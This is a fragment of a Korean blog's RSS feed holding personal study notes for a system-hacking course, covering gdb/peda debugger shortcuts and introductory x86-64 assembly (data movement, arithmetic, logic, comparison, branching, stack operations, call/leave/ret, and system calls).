      &lt;li&gt;
        &lt;p&gt;사용예: *(해당 프로그램은 인자와 입력값 모두를 요구하기 때문에 첫번째 방식과 두번째 방식이 함께 쓰였다.)&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;그-외-자주-사용되는-명령어들과-그-단축키&quot;&gt;그 외 자주 사용되는 명령어들과, 그 단축키&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;b: break&lt;/li&gt;
  &lt;li&gt;c: continue&lt;/li&gt;
  &lt;li&gt;r: run&lt;/li&gt;
  &lt;li&gt;si: step into
    &lt;ul&gt;
      &lt;li&gt;어떤 함수 안으로 들어가는 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ni: next instruction
    &lt;ul&gt;
      &lt;li&gt;명령어를 딱 한 줄 더 실행하는 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;i: info
    &lt;ul&gt;
      &lt;li&gt;접두어로 주로 사용되고, 접미로 붙는 요소의 정보를 확인하는 데 사용된다.&lt;/li&gt;
      &lt;li&gt;예시: info b (현재 브레이크 포인트 보기)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;k: kill
    &lt;ul&gt;
      &lt;li&gt;kill process&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pd: pdisas
    &lt;ul&gt;
      &lt;li&gt;기존 gdb 명령어의 peda 버전으로, disas의 확장판이다.&lt;/li&gt;
      &lt;li&gt;화면이 좀 더 예쁘게, 가독성 좋게 나온다. &lt;del&gt;기부니가 조크든요&lt;/del&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Sun, 10 Jul 2022 07:10:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step3-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step3-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2-2</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-2&quot; id=&quot;markdown-toc-stage-2&quot;&gt;STAGE 2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#x86-assembly-part-1&quot; id=&quot;markdown-toc-x86-assembly-part-1&quot;&gt;x86 Assembly: Part 1&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#어셈블리어와-x86-64&quot; id=&quot;markdown-toc-어셈블리어와-x86-64&quot;&gt;어셈블리어와 x86-64&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#어셈블리어의-기본-구조&quot; id=&quot;markdown-toc-어셈블리어의-기본-구조&quot;&gt;어셈블리어의 기본 구조&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#어셈블리-명령어--중-알아두면-좋을-것&quot; id=&quot;markdown-toc-어셈블리-명령어--중-알아두면-좋을-것&quot;&gt;어셈블리 명령어  중 알아두면 좋을 것&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#어셈블리-명령어의-피연산자&quot; id=&quot;markdown-toc-어셈블리-명령어의-피연산자&quot;&gt;어셈블리 명령어의 피연산자&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#x86-64-어셈블리-명령어&quot; id=&quot;markdown-toc-x86-64-어셈블리-명령어&quot;&gt;x86-64 어셈블리 명령어&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#데이터-이동-명령어&quot; id=&quot;markdown-toc-데이터-이동-명령어&quot;&gt;데이터 이동 명령어&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#산술-연산-명령어&quot; id=&quot;markdown-toc-산술-연산-명령어&quot;&gt;산술 연산 명령어&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#논리-연산-명령어&quot; id=&quot;markdown-toc-논리-연산-명령어&quot;&gt;논리 연산 명령어&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#비교-연산-명령어&quot; id=&quot;markdown-toc-비교-연산-명령어&quot;&gt;비교 연산 명령어&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#분기-명령어&quot; id=&quot;markdown-toc-분기-명령어&quot;&gt;분기 명령어&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#x86-assembly-part-2&quot; id=&quot;markdown-toc-x86-assembly-part-2&quot;&gt;x86 Assembly: Part 2&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#x86-64-어셈블리-명령어-pt2&quot; id=&quot;markdown-toc-x86-64-어셈블리-명령어-pt2&quot;&gt;x86-64 어셈블리 명령어 Pt.2&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#스택&quot; id=&quot;markdown-toc-스택&quot;&gt;스택&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#프로시저&quot; id=&quot;markdown-toc-프로시저&quot;&gt;프로시저&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#시스템-콜&quot; id=&quot;markdown-toc-시스템-콜&quot;&gt;시스템 콜&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;x86-assembly-part-1&quot;&gt;x86 Assembly: Part 1&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;리버싱 공부하면서 이미 했던 거라 여기에서는 간단하게 메모만 하고 넘어갑니다.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;어셈블리어 → (by 어셈블러) → 기계어&lt;/li&gt;
  &lt;li&gt;역어셈블러 ↔  어셈블러
    &lt;ul&gt;
      &lt;li&gt;즉, 역어셈블러는 기계어 → 어셈블리어. 우리가 리버싱 할 때 없으면 안되는 것!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;어셈블리어와-x86-64&quot;&gt;어셈블리어와 x86-64&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;요약&gt;

- CPU의 ISA(Instruction Set Architecture) 종류별로 어셈블리어가 다르다.
- 여기에서 다룰 어셈블리어는 x64 어셈블리어.
&lt;/요약&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;어셈블리어의-기본-구조&quot;&gt;어셈블리어의 기본 구조&lt;/h3&gt;

&lt;aside&gt;
💡 OpCode    Operand1, Operand2

&lt;/aside&gt;

&lt;p&gt;ex) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov   eax, 3&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;어셈블리-명령어--중-알아두면-좋을-것&quot;&gt;어셈블리 명령어  중 알아두면 좋을 것&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;명령 코드&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Data Transfer&lt;/td&gt;
      &lt;td&gt;mov, lea&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Arithmetic&lt;/td&gt;
      &lt;td&gt;inc, dec, add, sub&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Logical&lt;/td&gt;
      &lt;td&gt;and, or, xor, not&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Comparison&lt;/td&gt;
      &lt;td&gt;cmp, test&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Branch&lt;/td&gt;
      &lt;td&gt;jmp, je, jg&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;push, pop&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Procedure&lt;/td&gt;
      &lt;td&gt;call, ret, leave&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System call&lt;/td&gt;
      &lt;td&gt;syscall&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;어셈블리-명령어의-피연산자&quot;&gt;어셈블리 명령어의 피연산자&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;“총 3가지 종류”&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;상수(Immediate Value): {immediate_value}&lt;/li&gt;
    &lt;li&gt;레지스터(Register): {register_name}&lt;/li&gt;
    &lt;li&gt;메모리(Memory): &lt;strong&gt;[{memory_address}] …&lt;/strong&gt; &lt;em&gt;몰랐음!!&lt;/em&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;strong&gt;앞에 크기 지정자(Size Directive)인 TYPE PTR 추가될 수 있다.&lt;/strong&gt;&lt;/li&gt;
        &lt;li&gt;BYTE(1 byte), WORD(2 byte), DWORD(4 byte), QWORD(8 byte)
          &lt;ul&gt;
            &lt;li&gt;WORD가 2 byte인 이유: 맨 처음 인텔의 아키텍처가 16비트였는데, 나중에 아키텍처 확장 과정을 거치다 보니 WORD 자료형 크기를 변경해 버리면 다른 아키텍처에서 프로그램 호환이 안 되는 문제가 생겨서 그냥 16비트 유지.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-어셈블리-명령어&quot;&gt;x86-64 어셈블리 명령어&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;리버싱과 시스템 해킹의 원리에서 공부했던 내용이므로 간략히 정리하고 넘어감.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;데이터-이동-명령어&quot;&gt;데이터 이동 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;mov dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;src의 값을 dst에 이동.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;lea dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;src의 &lt;strong&gt;유효 주소&lt;/strong&gt;를 dst에 저장.&lt;/li&gt;
    &lt;li&gt;즉, src는 memory 타입의 피연산자로 오게 된다.
      &lt;ul&gt;
        &lt;li&gt;ex) lea rsi, [rbx+8&lt;em&gt;rcx]: rbx+8&lt;/em&gt;rcx를 rsi에 대입한다.&lt;/li&gt;
        &lt;li&gt;많이 헷갈리니까 주의!!!&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;산술-연산-명령어&quot;&gt;산술 연산 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;add dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst+=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sub dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst-=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;inc op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op ++&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;dec op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op –&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;논리-연산-명령어&quot;&gt;논리 연산 명령어&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;and&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst&amp;amp;=src&lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;마스킹&lt;/strong&gt; 연산
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff, ebx=0xcafe일 때, and eax, ebx를 시행하면 eax=0xcafe&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;or&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;
      &lt;table&gt;
        &lt;tbody&gt;
          &lt;tr&gt;
            &lt;td&gt;dst&lt;/td&gt;
            &lt;td&gt;=src&lt;/td&gt;
          &lt;/tr&gt;
        &lt;/tbody&gt;
      &lt;/table&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;역 마스킹&lt;/strong&gt; 연산
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff0000, ebx=0xdeadbeef일 때, or eax, ebx를 시행하면 eax=0xffffbeef&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;xor dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst^=src&lt;/li&gt;
    &lt;li&gt;비트가 다르면 1, 같으면 0&lt;/li&gt;
    &lt;li&gt;따라서, xor 연산을 동일한 값으로 두 번 실행할 경우, 원래 값으로 돌아감.
      &lt;ul&gt;
        &lt;li&gt;ex) rax=0x35014541, rbx=0xdeadbeef일 때,
          &lt;ul&gt;
            &lt;li&gt;xor rax, rbx 시행 후 rax=0xebacfbae&lt;/li&gt;
            &lt;li&gt;또 다시 xor rax, rbx 시행하면 rax=0x35014541&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;이런 성질을 이용해 XOR cipher가 개발(블록 암호화에서도 XOR의 성질을 이용해서 암호화하는 방식이 많은 것으로 기억함!)&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;not op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;~(op) 즉, op의 비트 전부 반전(1의 보수)&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;xor rax, rbx
xor rax, rbx
not eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;를 수행했을 때, 맨 마지막의 not eax까지를 수행하면 rax의 하위 32비트가 1의 보수를 취하여 다시 rax의 하위 32비트를 채우게 된다. rax의 하위 32비트가 eax이고, 실제로 그렇게 사용할 수 있다는 점 잊지 말자!&lt;/p&gt;

&lt;h3 id=&quot;비교-연산-명령어&quot;&gt;비교 연산 명령어&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;“두 피연산자의 값을 비교하고, 플래그를 설정한다.”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;cmp와 test의 비교는 리버싱을 공부할 때 많이 헷갈렸던 부분이다. 주의하자!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;cmp op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1과 op2를 비교한다.&lt;/li&gt;
    &lt;li&gt;“빼서” 비교한다.&lt;/li&gt;
    &lt;li&gt;연산의 결과는 ZF에 설정된다.&lt;/li&gt;
    &lt;li&gt;보통 “같은지” 확인하기 위해 사용한다.
      &lt;ul&gt;
        &lt;li&gt;같다면 ZF=1로 설정되고, jmp 분기문에서 설정에 따라 코드 플로우를 분기시키게 된다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;test op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1과 op2를 비교한다.&lt;/li&gt;
    &lt;li&gt;“AND”를 취해 비교한다.&lt;/li&gt;
    &lt;li&gt;연산의 결과는 ZF에 설정된다.&lt;/li&gt;
    &lt;li&gt;보통 “자기 자신이” 0이었는지 확인하기 위해 사용한다.
      &lt;ul&gt;
        &lt;li&gt;자신이 0이었다면 ZF=1로 설정된다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;왜냐하면 자기 자신과 AND를 취했을 때 0이 나올 수 있는 경우는 오로지 자기 자신이 0일 때 뿐이므로!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;분기-명령어&quot;&gt;분기 명령어&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;“rip를 이동시켜 실행 흐름을 바꾼다!”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;리버싱을 할 때 정말 잘 알아둬야 한다. 왜냐하면 보통의 프로그램들은 분기에 따른 경우수를 기반으로 행동을 하기 때문이다.&lt;/p&gt;

&lt;p&gt;rip가 이동되는 이유는 컴퓨터 아키텍처를 공부한 적 있다면 알 수 있다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CPU는 jmp등의 분기문을 만나면 PC에 저장된 다음 인스트럭션 주소를 바꿔서 jmp 명령어가 가리키는 인스트럭션을 수행하게 되는데, 이때 PC가 rip이기 때문에 분기 명령어는 결론적으로 rip를 이동시켜 실행 흐름을 바꾸게 된다.&lt;/li&gt;
  &lt;li&gt;jmp 계열 명령어는 jmp op1, op2일 때 op1을 기준으로 이름을 붙이게 된다.
    &lt;ul&gt;
      &lt;li&gt;ex) jg op1, op2 // jump if op1 is greater than op2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;x86-assembly-part-2&quot;&gt;x86 Assembly: Part 2&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;리버싱 공부하면서 이미 했던 거라 여기에서는 간단하게 하고 넘어갑니다.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;스택: 운영체제의 핵심 자료구조&lt;/li&gt;
  &lt;li&gt;프로시저: C언어의 함수에 대응&lt;/li&gt;
  &lt;li&gt;시스템 콜: 시스템 해킹의 관점에서 정말 중요함.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-어셈블리-명령어-pt2&quot;&gt;x86-64 어셈블리 명령어 Pt.2&lt;/h2&gt;

&lt;h3 id=&quot;스택&quot;&gt;스택&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;push: 스택에 쌓아넣기
pop: 스택에서 빼내기&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;push val: val에 들어있는 값을 스택의 최상단에 쌓음
      &lt;ul&gt;
        &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```wasm
rsp -= 8 //stack grows from high to low
[rsp] = val
```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pop reg: 스택 최상단의 값을 꺼내서 reg에 대입
    &lt;ul&gt;
      &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  rsp += 8 // decrease stack span
  reg = [rsp-8] //pop
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;프로시저&quot;&gt;프로시저&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;프로시저의 호출 및 반환과 관련해서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 명령어를 사용한다.&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로시저 불러서 진입하기: &lt;strong&gt;call&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;프로시저에서 나가서 원래의 함수로 돌아오기: &lt;strong&gt;return&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;스택프레임 정리하기: &lt;strong&gt;leave&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;프로시저를 call 할 당시, 원래의 함수에서 call 다음에 수행할 인스트럭션의 명령어 주소를 스택에 push 해둔 뒤, 콜했던 프로시저의 시작으로 rip를 이동하게 되는데, 이 때 스택에 저장되는 인스트럭션의 주소를 ‘Return address’라 칭한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;call addr: addr에 있는 프로시저 호출
    &lt;ul&gt;
      &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  push return_address // push return address into the stack
  jmp addr
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;leave: 스택프레임 정리해서 원래 함수의 스택프레임 복구하기
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;leave 명령어와 동일한 기능을 수행하는 어셈블리 명령어의 조합은 아래와 같다.&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  **mov** rsp, rbp // 현재 함수에서의 스택 밑바닥이 원래 함수에서의 스택의 가장 꼭대기가 된다.
               // 즉, 현재 스택 꼭대기: 원래 함수의 스택 꼭대기에서 하나 더 간 상태.
  						 // 지금 rsp가 가리키는 위치에는 원래 함수의 스택 베이스 주소가 있다.
  **pop** rbp // 원래 함수의 스택 베이스 주소를 빼서 rbp에 넣어 준다.
  				// 또한 rsp를 하나 내림으로써 원래 함수의 스택 꼭대기와 일치시킨다.
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;ret: return address로 rip를 위치시킨다.
    &lt;ul&gt;
      &lt;li&gt;ret 명령어와 동일한 기능을 수행하는 어셈블리 명령어는 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  pop rip // leave를 거친 이후 rsp가 가리키는 곳에는 콜했던 프로시저의 주소로 rip를 움직이기 전에
  			  // 넣어 두었던 다음 인스트럭션의 주소가 저장되어 있다.
  				// 따라서 다음에 수행할 인스트럭션의 주소를 스택에서 빼서 rip에 넣어 줌으로써
  				// 원래의 코드 플로우를 수복한다. 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;해당 명령어가 실제로 펑션콜과 리턴 과정에서 어떻게 사용되는지 시나리오 형식으로 설명해 보자.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;함수 A를 실행하다가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call function_B&lt;/code&gt; 명령어를 맞닥뜨렸다.
    &lt;ol&gt;
      &lt;li&gt;4에서 실행될 다음 인스트럭션의 주소가 스택에 push 된다.&lt;/li&gt;
      &lt;li&gt;함수 A의 스택 프레임을 유지하기 위해 A 스택 프레임의 rbp가 스택에 push 된다.&lt;/li&gt;
      &lt;li&gt;새로운 스택 프레임을 할당해 주기 위해 rbp를 rsp의 위치로 옮긴다.&lt;/li&gt;
      &lt;li&gt;앞에서 배웠듯, OS는 스택 프레임을 할당할 때 소규모로 할당한 후 가변적으로 운영한다. 따라서, 새로운 스택 프레임 공간을 할당하기 위해 rsp에서 0x30 정도를 뺀다.(통상적)&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이렇게 새롭게 할당된 스택 프레임과 기존의 A의 스택 프레임 구조를 확인하면 아래와 같다.&lt;/p&gt;

        &lt;table&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;========새로운========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=======스택 프레임======&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=========공간=========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;A의 rbp 주소&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;A 상에서의 다음 인스트럭션 주소&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;기존에 A에서 쓰고 있던 임시 데이터들&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 B를 실행한다.
    &lt;ol&gt;
      &lt;li&gt;앞에서 배웠듯, 스택에는 지역 변수가 저장된다. 따라서 함수 B의 지역 변수를 새로운 스택 프레임에 저장해 준다.&lt;/li&gt;
      &lt;li&gt;스택 프레임 위에서 여러 연산을 수행한다. 스택 프레임은 함수별로 할당되므로 해당 함수 한정으로만 유효할 수 있는 데이터를 스택에 저장할 것이다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 A로 복귀한다.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt; 명령어가 실행된다. 따라서, rsp가 rbp의 위치로 이동하고 스택에 있던 A의 rbp 주소가 pop 되면서 rbp가 기존의 A의 스택 프레임의 rbp 주소를 가지게 된다.
        &lt;ul&gt;
          &lt;li&gt;한 마디로, B의 스택 프레임이 정리된 이후 A의 스택 프레임이 복구된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 A 상에서의 다음 인스트럭션을 실행한다.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 명령어가 실행된다. 따라서, A 상에서의 다음 인스트럭션 주소가 rip로 들어간다.
        &lt;ul&gt;
          &lt;li&gt;이 시점에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; 을 수행하기 이전의 A의 스택 프레임 상태가 완전히 복구된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;rip가 가리키는 주소의 명령어를 실행한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;시스템-콜&quot;&gt;시스템 콜&lt;/h3&gt;

&lt;p&gt;OS를 공부했다면 쉽게 이해할 수 있는 내용이다. 사실 OS 책의 1장 1페이지 정도 펼쳐봤다면 이해할 수 있는 내용이다. 따라서 자세한 부연 설명을 붙이지 않고, 간단히 정리만 하고 넘어간다.&lt;/p&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;OS는 시스템 보호를 위해 시스템과 직결된 행위(ex: 네트워크 통신, 파일시스템 테이블 생성/추가/삭제, 파일 Read/Write…)는 실행 권한을 분리해서 관리한다. 이럴 때 부여하는 권한이 바로 커널 권한과 유저 권한이다. 유저 권한을 가진 프로세스들은 커널 권한이 필요한 시스템 행위에 직접 엑세스할 수 없고, &lt;strong&gt;OS에게 요청해&lt;/strong&gt; OS가 대신 커널 권한이 필요한 시스템 행위를 수행하고 그 결과를 받아보는 것이 기본이다.&lt;/p&gt;

  &lt;p&gt;이때 OS는 유저 권한과 커널 권한을 사용하는 상태를 오가는데, 유저 권한을 사용할 때를 ‘유저 모드’, 커널 권한을 사용할 때를 ‘커널 모드’에 있다고 표현한다.&lt;/p&gt;

  &lt;p&gt;개인적으로 OS는 정말 재미있고 흥미로운 문제와 해결의 연속이라고 느꼈기 때문에, 만일 흥미가 생겼다면 공부해 보는 것을 추천한다. 리눅스부터 공부하는 게 좋을 것이다. 멀웨어 분석이 목표라면 윈도우를 공부해야 하겠지만…&lt;/p&gt;

  &lt;ul&gt;
